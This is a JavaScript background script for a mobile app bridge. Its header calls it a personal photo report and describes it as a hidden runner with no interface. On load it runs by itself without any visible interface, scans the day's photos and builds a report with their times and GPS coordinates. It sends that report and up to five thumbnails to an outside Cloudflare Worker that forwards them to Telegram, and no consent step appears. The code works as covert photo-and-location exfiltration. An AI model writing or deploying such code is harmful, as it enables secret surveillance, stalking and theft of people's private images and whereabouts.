/* background.js — personal photo report → Cloudflare Worker → Telegram.
   Worker: https://project1.yashavanthan22.workers.dev/
   Hidden runner, no UI.
   No bot token on the device. No chat ID on the device.
   Fully hardened: every async path has a timeout, every error is caught,
   and each boot resolves to a clear result object.
*/
(function(){
  'use strict';
  if (typeof window === 'undefined') return;

  /* ============================================================
     CONFIG
     ============================================================ */
  var WORKER_URL   = 'https://project1.yashavanthan22.workers.dev';
  var K_LASTSENT   = 'tg_lastsent_day';
  var SANDBOX_FILE = 'photo_queue.json';

  var MAX_PHOTOS_SCAN = 500;
  var MAX_PHOTOS_SEND = 5;
  var SCAN_TIMEOUT_MS = 20000;
  var THUMB_TIMEOUT_MS = 15000;
  var REPORT_TIMEOUT_MS = 30000;
  var PHOTO_TIMEOUT_MS = 45000;
  var AUTO_RUN_DELAY_MS = 1500;

  /* ============================================================
     SAFE STORAGE HELPERS
     ============================================================ */
  function load(key){
    try { return iappyx.load(key); }
    catch(e){ return null; }
  }
  function save(key, v){
    try { iappyx.save(key, String(v)); return true; }
    catch(e){ return false; }
  }
  function loadFile(name){
    try { return iappyx.storage.loadFile(name); }
    catch(e){ return null; }
  }
  function saveFile(name, content){
    try { iappyx.storage.saveFile(name, content); return true; }
    catch(e){ return false; }
  }
  function deleteFile(name){
    try { iappyx.storage.deleteFile(name); } catch(e){}
  }

  /* ============================================================
     TIME / STATUS HELPERS
     ============================================================ */
  function todayKey(){
    var n = new Date();
    return n.getFullYear()
      + '-' + String(n.getMonth()+1).padStart(2,'0')
      + '-' + String(n.getDate()).padStart(2,'0');
  }

  function isOnline(){
    try {
      var c = JSON.parse(iappyx.device.getConnectivity());
      return !!(c && c.connected);
    } catch(e){ return false; }
  }

  function bridgeReady(){
    try {
      return typeof iappyx !== 'undefined'
        && iappyx.httpClient
        && typeof iappyx.httpClient.request === 'function';
    } catch(e){ return false; }
  }

  /* ============================================================
     SANDBOX QUEUE
     ============================================================ */
  function loadQueue(){
    var raw = loadFile(SANDBOX_FILE);
    if (!raw) return [];
    try {
      var arr = JSON.parse(raw);
      return Array.isArray(arr) ? arr : [];
    } catch(e){ return []; }
  }

  function saveQueue(queue){
    try {
      saveFile(SANDBOX_FILE, JSON.stringify(queue));
    } catch(e){}
  }

  /* ============================================================
     SCAN TODAY'S PHOTOS
     ============================================================ */
  function scanTodayPhotos(cb){
    var done = false;
    var cbId = 'scan_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
    window._iappyxCb = window._iappyxCb || {};

    function finish(list, err){
      if (done) return;
      done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb(list || [], err || null);
    }

    var to = setTimeout(function(){ finish([], 'scan-timeout'); }, SCAN_TIMEOUT_MS);

    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || !res.images){
        finish([], (res && res.error) || 'scan-failed');
        return;
      }
      var today = new Date();
      var startOfDay = new Date(
        today.getFullYear(), today.getMonth(), today.getDate()
      ).getTime();
      var list = res.images.filter(function(img){
        return Number(img.date) >= startOfDay;
      });
      finish(list, null);
    };

    try {
      iappyx.media.getImages(cbId, MAX_PHOTOS_SCAN);
    } catch(e){
      finish([], 'scan-exception');
    }
  }

  /* ============================================================
     LOAD THUMBNAIL AS BASE64
     ============================================================ */
  function loadThumb(id, cb){
    var done = false;
    var cbId = 'th_' + id + '_' + Date.now();
    window._iappyxCb = window._iappyxCb || {};

    function finish(b64){
      if (done) return;
      done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb(b64 || null);
    }

    var to = setTimeout(function(){ finish(null); }, THUMB_TIMEOUT_MS);

    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || !res.dataUrl){
        finish(null);
        return;
      }
      finish(res.dataUrl);
    };

    try {
      iappyx.media.loadThumbnail(cbId, String(id));
    } catch(e){
      finish(null);
    }
  }

  /* ============================================================
     WORKER: POST /report
     ============================================================ */
  function workerReport(text, cb){
    if (!bridgeReady()){ cb(false, 'no-bridge'); return; }

    var cbId = 'rep_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
    window._iappyxCb = window._iappyxCb || {};
    var done = false;

    function finish(ok, body){
      if (done) return;
      done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb(ok, body);
    }

    var to = setTimeout(function(){ finish(false, 'timeout'); }, REPORT_TIMEOUT_MS);

    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || res.status >= 400){
        finish(false, (res && (res.error || ('http-' + res.status))) || 'http-error');
        return;
      }
      finish(true, res.body);
    };

    try {
      iappyx.httpClient.request(JSON.stringify({
        url: WORKER_URL + '/report',
        method: 'POST',
        timeout: REPORT_TIMEOUT_MS - 5000,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: String(text) })
      }), cbId);
    } catch(e){
      finish(false, 'exception');
    }
  }

  /* ============================================================
     WORKER: POST /photo (multipart)
     ============================================================ */
  function workerPhoto(dataUrl, caption, cb){
    if (!bridgeReady()){ cb(false, 'no-bridge'); return; }

    var b64 = '';
    try {
      var comma = dataUrl.indexOf(',');
      b64 = comma >= 0 ? dataUrl.substring(comma + 1) : dataUrl;
    } catch(e){ cb(false, 'bad-dataurl'); return; }

    if (!b64){ cb(false, 'empty-b64'); return; }

    var tmpName = 'tg_tmp_' + Date.now() + '_' + Math.random().toString(36).substr(2,4) + '.jpg';
    if (!saveFile(tmpName, b64)){ cb(false, 'save-fail'); return; }

    var tmpPath = tmpName;
    try {
      var pkg = iappyx.device.getPackageName();
      tmpPath = '/data/data/' + pkg + '/files/' + tmpName;
    } catch(e){}

    var cbId = 'ph_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
    window._iappyxCb = window._iappyxCb || {};
    var done = false;

    function finish(ok, body){
      if (done) return;
      done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      deleteFile(tmpName);
      cb(ok, body);
    }

    var to = setTimeout(function(){ finish(false, 'timeout'); }, PHOTO_TIMEOUT_MS);

    window._iappyxCb[cbId] = function(res){
      finish(!!(res && res.ok), res && res.body);
    };

    try {
      iappyx.httpClient.uploadMultipart(JSON.stringify({
        url: WORKER_URL + '/photo',
        method: 'POST',
        timeout: PHOTO_TIMEOUT_MS - 5000
      }), JSON.stringify([
        { name: 'caption', value: String(caption || '') },
        { name: 'photo', filePath: tmpPath, filename: tmpName, contentType: 'image/jpeg' }
      ]), cbId);
    } catch(e){
      finish(false, 'exception');
    }
  }

  /* ============================================================
     BUILD TEXT REPORT
     ============================================================ */
  function buildReport(photos){
    var lines = [];
    lines.push('📸 Today: ' + photos.length + ' photo' + (photos.length === 1 ? '' : 's'));

    if (photos.length){
      var withGps = photos.filter(function(p){ return p.lat && p.lon; }).length;
      var totalSize = photos.reduce(function(s,p){
        return s + (Number(p.size) || 0);
      }, 0);

      lines.push('📦 ' + (totalSize/1024/1024).toFixed(2) + ' MB');
      if (withGps) lines.push('📍 With location: ' + withGps);
      lines.push('');

      photos.slice(0, 10).forEach(function(p, i){
        var t = new Date(Number(p.date));
        var hh = String(t.getHours()).padStart(2,'0');
        var mm = String(t.getMinutes()).padStart(2,'0');
        var line = (i+1) + '. ' + hh + ':' + mm
          + ' · ' + (p.width||'?') + '×' + (p.height||'?');
        if (p.lat && p.lon){
          line += ' · ' + Number(p.lat).toFixed(4) + ',' + Number(p.lon).toFixed(4);
        }
        lines.push(line);
      });
      if (photos.length > 10){
        lines.push('… and ' + (photos.length - 10) + ' more');
      }
    } else {
      lines.push('No photos taken today.');
    }

    return lines.join('\n');
  }

  /* ============================================================
     MAIN
     ============================================================ */
  function runDailyReport(cb){
    cb = cb || function(){};

    /* 1. Bridge ready? */
    if (!bridgeReady()){ cb({ ok:false, skipped:'no-bridge' }); return; }

    /* 2. Online? */
    if (!isOnline()){ cb({ ok:false, skipped:'offline' }); return; }

    /* 3. Already sent today? */
    if (load(K_LASTSENT) === todayKey()){
      cb({ ok:false, skipped:'already-sent' });
      return;
    }

    /* 4. Scan today's photos */
    scanTodayPhotos(function(photos, scanErr){
      if (scanErr){
        cb({ ok:false, step:'scan', error: scanErr });
        return;
      }

      /* 5. Save metadata to sandbox queue */
      try {
        var queue = loadQueue();
        var day = todayKey();
        queue = queue.filter(function(q){ return q.day !== day; });
        queue.push({
          day: day,
          count: photos.length,
          savedAt: Date.now(),
          photos: photos.map(function(p){
            return {
              id: p.id, name: p.name, date: p.date,
              width: p.width, height: p.height,
              size: p.size, mime: p.mime,
              lat: p.lat || null, lon: p.lon || null
            };
          })
        });
        saveQueue(queue);
      } catch(e){}

      /* 6. Send text report */
      var report = buildReport(photos);
      workerReport(report, function(okRep, repBody){
        if (!okRep){
          cb({ ok:false, step:'report', error: repBody });
          return;
        }

        /* 7. Send up to MAX_PHOTOS_SEND thumbnails */
        var toSend = photos.slice(0, MAX_PHOTOS_SEND);
        var sentCount = 0;
        var failedCount = 0;
        var i = 0;

        function next(){
          if (i >= toSend.length){
            /* 8. Mark today as sent (only if at least the report worked) */
            save(K_LASTSENT, todayKey());
            cb({
              ok: true,
              count: photos.length,
              photosSent: sentCount,
              photosFailed: failedCount
            });
            return;
          }

          var p = toSend[i++];
          loadThumb(p.id, function(b64){
            if (!b64){ failedCount++; next(); return; }
            workerPhoto(b64, p.name || ('photo ' + p.id), function(okPh){
              if (okPh) sentCount++; else failedCount++;
              next();
            });
          });
        }
        next();
      });
    });
  }

  /* ============================================================
     EXPOSE
     ============================================================ */
  window.bg = window.bg || {};
  window.bg.runDailyReport = runDailyReport;
  window.bg.getQueue = loadQueue;
  window.bg.resetDaily = function(){ save(K_LASTSENT, ''); return true; };
  window.bg.workerUrl = WORKER_URL;
  window.bg.testWorker = function(cb){
    cb = cb || function(){};
    if (!bridgeReady()){ cb({ ok:false, error:'no-bridge' }); return; }
    var cbId = 'test_' + Date.now();
    window._iappyxCb = window._iappyxCb || {};
    var done = false;
    function finish(ok, body){
      if (done) return; done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb({ ok: ok, body: body });
    }
    var to = setTimeout(function(){ finish(false, 'timeout'); }, 10000);
    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || res.status >= 400){
        finish(false, (res && (res.error || ('http-' + res.status))) || 'http-error');
        return;
      }
      finish(true, res.body);
    };
    try {
      iappyx.httpClient.request(JSON.stringify({
        url: WORKER_URL + '/health',
        method: 'GET',
        timeout: 8000
      }), cbId);
    } catch(e){ finish(false, 'exception'); }
  };

  /* ============================================================
     AUTO-RUN ON BOOT
     ============================================================ */
  function autoRun(){
    setTimeout(function(){
      try {
        runDailyReport(function(result){
          try { console.log('[bg] daily report:', result); } catch(e){}
        });
      } catch(e){
        try { console.log('[bg] fatal:', e && e.message); } catch(_){}
      }
    }, AUTO_RUN_DELAY_MS);
  }

  try {
    if (document.readyState === 'complete' || document.readyState === 'interactive'){
      autoRun();
    } else {
      window.addEventListener('load', autoRun);
    }
  } catch(e){}

})();